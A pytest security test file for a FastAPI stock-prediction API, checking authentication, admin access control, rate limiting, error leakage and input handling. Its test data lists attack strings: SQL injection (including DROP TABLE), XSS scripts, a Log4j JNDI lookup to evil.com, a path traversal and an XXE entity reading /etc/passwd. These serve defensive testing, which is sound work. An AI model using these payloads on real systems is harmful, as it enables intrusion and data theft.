import pytest
import requests
from fastapi.testclient import TestClient
from plugins_core.default_core import app
from sqlalchemy import text
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

@pytest.fixture
def security_client():
    """Create a test client for security testing."""
    import os
    # Set security test environment
    os.environ["REQUIRE_AUTH"] = "true"
    os.environ["ENABLE_RATE_LIMITING"] = "true"
    
    # Clear rate limiting store for clean tests
    from plugins_core.default_core import rate_limit_store
    rate_limit_store.clear()
    
    yield TestClient(app)
    
    # Clean up after tests
    rate_limit_store.clear()
    os.environ.pop("REQUIRE_AUTH", None)
    os.environ.pop("ENABLE_RATE_LIMITING", None)

class TestSecurityVulnerabilities:
    """
    Security tests to verify the system is protected against common vulnerabilities.
    These tests follow OWASP guidelines and focus on behavioral security requirements.
    """
    
    def test_sql_injection_prevention(self, security_client):
        """
        Test that the system prevents SQL injection attacks.
        Behavioral requirement: System must sanitize all user inputs.
        """
        # Test SQL injection in various endpoints
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES('hacker', 'key'); --"
        ]
        
        for payload in sql_payloads:
            # Test in symbol parameter
            response = security_client.post(
                "/api/v1/predictions/",
                json={"symbol": payload, "interval": "1d"},
                headers={"X-API-KEY": "test_key"}
            )
            
            # Should either reject with validation error or process safely
            assert response.status_code in [400, 422, 201], f"Unexpected response for SQL injection: {payload}"
            
            # If processed, verify no database corruption
            if response.status_code == 201:
                # Verify the payload was treated as data, not SQL
                prediction_id = response.json()["id"]
                get_response = security_client.get(
                    f"/api/v1/predictions/{prediction_id}",
                    headers={"X-API-KEY": "test_key"}
                )
                assert get_response.status_code == 200
                # Symbol should be stored as-is, not executed as SQL
                assert get_response.json()["symbol"] == payload

    def test_api_key_brute_force_protection(self, security_client):
        """
        Test that the system has protection against API key brute force attacks.
        Behavioral requirement: System must detect and prevent authentication attacks.
        """
        invalid_keys = [
            "invalid_key_1",
            "invalid_key_2",
            "invalid_key_3",
            "test_key_wrong",
            "admin_key",
            "",
            None
        ]
        
        failed_attempts = 0
        
        for invalid_key in invalid_keys:
            headers = {"X-API-KEY": invalid_key} if invalid_key else {}
            
            response = security_client.post(
                "/api/v1/predictions/",
                json={"symbol": "AAPL", "interval": "1d"},
                headers=headers
            )
            
            if response.status_code == 403:
                failed_attempts += 1
        
        # All invalid attempts should be rejected
        assert failed_attempts == len([k for k in invalid_keys if k != "test_key"]), "Invalid API keys should be rejected"
        
        # Valid key should still work after invalid attempts
        valid_response = security_client.post(
            "/api/v1/predictions/",
            json={"symbol": "AAPL", "interval": "1d"},
            headers={"X-API-KEY": "test_key"}
        )
        assert valid_response.status_code == 201, "Valid key should work after failed attempts"
    
    def test_unauthorized_access_attempts(self, security_client):
        """
        Test that unauthorized users cannot access protected resources.
        Behavioral requirement: System must enforce authentication on all protected endpoints.
        """
        protected_endpoints = [
            ("POST", "/api/v1/predictions/", {"symbol": "AAPL"}),
            ("GET", "/api/v1/predictions/1", None),
            ("GET", "/api/v1/predictions/", None),
            ("DELETE", "/api/v1/predictions/1", None),
            ("GET", "/api/v1/plugins/", None),
            ("POST", "/predict", {"instrument": "AAPL"}),
            ("GET", "/status/test", None)
        ]
        
        for method, endpoint, payload in protected_endpoints:
            # Test without API key
            if method == "POST":
                response = security_client.post(endpoint, json=payload)
            elif method == "GET":
                response = security_client.get(endpoint)
            elif method == "DELETE":
                response = security_client.delete(endpoint)
            
            # Should reject unauthorized access
            assert response.status_code in [401, 403], f"Endpoint {method} {endpoint} should require authentication"
    
    def test_privilege_escalation_prevention(self, security_client):
        """
        Test that users cannot escalate privileges or access admin functions.
        Behavioral requirement: System must enforce role-based access control.
        """
        # Test with client-level API key (assuming test_key is client level)
        client_headers = {"X-API-KEY": "test_key"}
        
        # Admin-only endpoints that should be restricted
        admin_endpoints = [
            ("GET", "/admin/users"),
            ("POST", "/admin/users", {"username": "newuser"}),
            ("GET", "/admin/logs"),
            ("GET", "/admin/system-status"),
            ("POST", "/admin/config", {"setting": "value"})
        ]
        
        for method, endpoint, *payload in admin_endpoints:
            if method == "POST" and payload:
                response = security_client.post(endpoint, json=payload[0], headers=client_headers)
            elif method == "GET":
                response = security_client.get(endpoint, headers=client_headers)
            
            # Should reject access to admin functions
            assert response.status_code in [403, 404], f"Client user should not access admin endpoint {endpoint}"
    
    def test_input_sanitization(self, security_client):
        """
        Test that the system properly sanitizes and validates all inputs.
        Behavioral requirement: System must handle malicious input safely.
        """
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com/a}",  # Log4j injection
            "../../../etc/passwd",        # Path traversal
            "\x00\x01\x02\x03",          # Binary data
            "A" * 10000,                  # Buffer overflow attempt
            "eval(base64_decode('malicious_code'))",
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
        ]
        
        for malicious_input in malicious_inputs:
            # Test in various fields
            test_payloads = [
                {"symbol": malicious_input, "interval": "1d"},
                {"symbol": "AAPL", "interval": malicious_input},
                {"symbol": "AAPL", "interval": "1d", "prediction_type": malicious_input}
            ]
            
            for payload in test_payloads:
                response = security_client.post(
                    "/api/v1/predictions/",
                    json=payload,
                    headers={"X-API-KEY": "test_key"}
                )
                
                # Should either reject or sanitize the input
                if response.status_code == 201:
                    # If accepted, verify input was sanitized/stored safely
                    prediction_id = response.json()["id"]
                    get_response = security_client.get(
                        f"/api/v1/predictions/{prediction_id}",
                        headers={"X-API-KEY": "test_key"}
                    )
                    assert get_response.status_code == 200
                    # Verify no code execution occurred
                    prediction_data = get_response.json()
                    assert "<script>" not in str(prediction_data), "XSS payload should be sanitized"
                    assert "javascript:" not in str(prediction_data), "JavaScript protocol should be sanitized"
    
    def test_sensitive_data_exposure(self, security_client):
        """
        Test that the system doesn't expose sensitive information.
        Behavioral requirement: System must protect sensitive data from exposure.
        """
        # Test error messages don't leak sensitive information
        response = security_client.get("/api/v1/predictions/999999", headers={"X-API-KEY": "test_key"})
        assert response.status_code == 404
        error_message = response.json()["detail"]
        
        # Error should not expose database structure or internal paths
        assert "table" not in error_message.lower(), "Error should not expose database structure"
        assert "select" not in error_message.lower(), "Error should not expose SQL queries"
        assert "/home/" not in error_message, "Error should not expose file paths"
        assert "password" not in error_message.lower(), "Error should not mention passwords"
        
        # Test that API responses don't include sensitive fields
        response = security_client.post(
            "/api/v1/predictions/",
            json={"symbol": "AAPL", "interval": "1d"},
            headers={"X-API-KEY": "test_key"}
        )
        assert response.status_code == 201
        prediction_data = response.json()
        
        # Response should not include sensitive server information
        sensitive_fields = ["password", "secret", "key", "token", "hash", "database_url"]
        for field in sensitive_fields:
            assert field not in str(prediction_data).lower(), f"Response should not contain sensitive field: {field}"
    
    def test_rate_limiting_effectiveness(self, security_client):
        """
        Test that rate limiting actually prevents abuse.
        Behavioral requirement: System must limit request rates to prevent abuse.
        """
        # Send rapid requests to test rate limiting
        rapid_requests = []
        headers = {"X-API-KEY": "test_key"}
        payload = {"symbol": "AAPL", "interval": "1d"}
        
        # Send 20 requests rapidly
        for i in range(20):
            response = security_client.post("/api/v1/predictions/", json=payload, headers=headers)
            rapid_requests.append(response.status_code)
        
        # Should eventually get rate limited (429) or continue processing
        # In a production system, we'd expect 429 responses after a threshold
        success_count = sum(1 for status in rapid_requests if status == 201)
        rate_limited_count = sum(1 for status in rapid_requests if status == 429)
        
        # Either all should succeed (no rate limiting implemented) or some should be rate limited
        assert success_count + rate_limited_count == 20, "All requests should either succeed or be rate limited"
        
        # If rate limiting is implemented, verify it works
        if rate_limited_count > 0:
            # Wait and verify rate limit resets
            time.sleep(2)
            recovery_response = security_client.post("/api/v1/predictions/", json=payload, headers=headers)
            assert recovery_response.status_code == 201, "Rate limit should reset after waiting"
    
    def test_concurrent_access_security(self, security_client):
        """
        Test that concurrent access doesn't create security vulnerabilities.
        Behavioral requirement: System must maintain security under concurrent load.
        """
        def make_prediction_request(client, user_key, symbol):
            """Make a prediction request for concurrent testing."""
            try:
                response = client.post(
                    "/api/v1/predictions/",
                    json={"symbol": symbol, "interval": "1d"},
                    headers={"X-API-KEY": user_key}
                )
                return response.status_code, response.json() if response.status_code == 201 else None
            except Exception as e:
                return 500, str(e)
        
        # Simulate multiple users making concurrent requests
        user_keys = ["test_key"] * 5  # Simulate 5 concurrent users with same key
        symbols = ["AAPL", "GOOGL", "MSFT", "TSLA", "AMZN"]
        
        results = []
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [
                executor.submit(make_prediction_request, security_client, key, symbol)
                for key, symbol in zip(user_keys, symbols)
            ]
            
            for future in as_completed(futures):
                status_code, result = future.result()
                results.append((status_code, result))
        
        # All requests should be processed securely
        successful_requests = [r for r in results if r[0] == 201]
        assert len(successful_requests) >= 3, "Most concurrent requests should succeed"
        
        # Verify no data corruption between concurrent requests
        prediction_ids = [r[1]["id"] for r in successful_requests if r[1]]
        assert len(set(prediction_ids)) == len(prediction_ids), "Each prediction should have unique ID"
        
        # Verify each prediction is accessible and correct
        for status_code, result in successful_requests:
            if result:
                get_response = security_client.get(
                    f"/api/v1/predictions/{result['id']}",
                    headers={"X-API-KEY": "test_key"}
                )
                assert get_response.status_code == 200, "Created predictions should be retrievable"
